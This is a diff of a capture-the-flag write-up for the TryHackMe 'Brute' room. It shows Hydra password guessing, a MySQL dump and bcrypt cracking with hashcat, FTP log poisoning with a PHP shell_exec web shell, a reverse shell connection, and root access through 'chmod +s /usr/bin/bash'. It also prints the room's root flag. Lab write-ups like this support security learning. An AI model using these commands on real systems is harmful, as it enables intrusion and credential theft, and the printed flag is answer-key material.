@@ -6,7 +6,6 @@ You as well, Brutus?
 
 ![](https://tryhackme-images.s3.amazonaws.com/room-icons/8dedd4f34a2aff294744a0572773eb5d.png)
 
-
 ### What is the root and user flag?
 
  Start Machine
@@ -219,7 +218,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-13 11:09:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-13 11:09:57
 
-
 ┌──(kali㉿kali)-[~/nappy]
 └─$ mysql -h 10.10.183.215 -u root -p           
 Enter password: 
@@ -287,13 +285,11 @@ MySQL [website]> select * from users;
 +----+----------+--------------------------------------------------------------+---------------------+
 1 row in set (0.412 sec)
 
-
 https://hashcat.net/wiki/doku.php?id=example_hashes ($2*$ bcrypt --> 3200)
 
 ┌──(kali㉿kali)-[~/nappy]
 └─$ cat hash_brute            
 $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we
-
 
 ┌──(kali㉿kali)-[~/nappy]
 └─$ hashcat -m 3200 -a 0 hash_brute /usr/share/wordlists/rockyou.txt -o hash_brute_cracked
@@ -348,11 +344,9 @@ Hardware.Mon.#1..: Util: 72%
 Started: Fri Jan 13 11:16:09 2023
 Stopped: Fri Jan 13 11:18:49 2023
 
-
 ┌──(kali㉿kali)-[~/nappy]
 └─$ hashcat -m 3200 -a 0 hash_brute --show                                                
 $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger
-
 
 ┌──(kali㉿kali)-[~/nappy]
 └─$ cat hash_brute_cracked 
@@ -407,7 +401,6 @@ Ncat: Connected to 10.10.183.215:21.
 whoami
 530 Please login with USER and PASS.
 
-
 Ftp log poisoning
 https://secnhack.in/ftp-log-poisoning-through-lfi/
 
@@ -426,7 +419,6 @@ Estas son líneas de código PHP que permiten ejecutar comandos en el sistema op
 -   En la cuarta línea, el comando se recibe a través de la variable $_GET['x'] y su salida se muestra en la página web usando la función shell_exec().
 
 Sin embargo, estas líneas de código son altamente peligrosas ya que permiten a un atacante ejecutar cualquier comando en el sistema operativo del servidor, incluyendo comandos maliciosos. Es importante asegurarse de validar y sanitizar cualquier entrada del usuario antes de utilizarlo en una función como system() o shell_exec().
-
 
 ┌──(kali㉿kali)-[~/nappy]
 └─$ ftp 10.10.183.215
@@ -461,7 +453,6 @@ Ncat: Connection from 10.10.183.215:51494.
 www-data@brute:/var/www/html$ exit
 exit
 exit
-
 
 or
 
@@ -567,7 +558,6 @@ This command is similar to the previous one. It sets the TERM environment variab
 256 color terminal allows the terminal to display more colors than the traditional 8-color terminal, thus providing more visual options and better color representation. This feature is useful in applications such as text editors and terminal-based games that require advanced color support.
 
 It's also important to note that some applications may require the TERM variable to be set to a specific value in order to function properly. Setting the TERM variable to the correct value ensures that these applications will work as expected.
-
 
 www-data@brute:/var/www/html$ ls
 ls
@@ -871,16 +861,13 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-89-generic x86_64)
   Memory usage: 62%                IPv4 address for eth0: 10.10.183.215
   Swap usage:   0%
 
-
 18 updates can be applied immediately.
 8 of these updates are standard security updates.
 To see these additional updates run: apt list --upgradable
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Tue Apr  5 23:46:50 2022 from 10.0.2.26
 adrian@brute:~$ cd /home/adrian
@@ -955,7 +942,6 @@ adrian@brute:~$ chmod +x pspy64s
 
 adrian@brute:~$ ./pspy64s 
 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
-
 
      ██▓███    ██████  ██▓███ ▓██   ██▓
     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
@@ -1226,7 +1212,6 @@ or
 
 `chmod +s /usr/bin/bash` 
 
-
 The command `chmod u+s /usr/bin/bash` and `chmod +s /usr/bin/bash` are very similar in their effect, both are used to make the file /usr/bin/bash a set-user-ID program, meaning that when the file is executed, it runs with the effective user ID of the file's owner, rather than the user who is executing the file.
 
 The main difference is the letter 'u' in the first command, this specify that only the owner (user) will be granted with the set-user-ID permission, while in the second command the '+' symbol means that all users (owner, group, and others) will be granted with the set-user-ID permission.
@@ -1241,14 +1226,7 @@ adrian@brute:~$ /usr/bin/bash -p
 bash-5.0# whoami
 root
 
-
-
-
 ```
-
-![[Pasted image 20230113112319.png]]
-
-![[Pasted image 20230113122130.png]]
 
 What is the user flag?  
 
@@ -1257,6 +1235,5 @@ What is the user flag?
 What is the root flag?
 
 *THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}*
-
 
 [[Content Security Policy]]
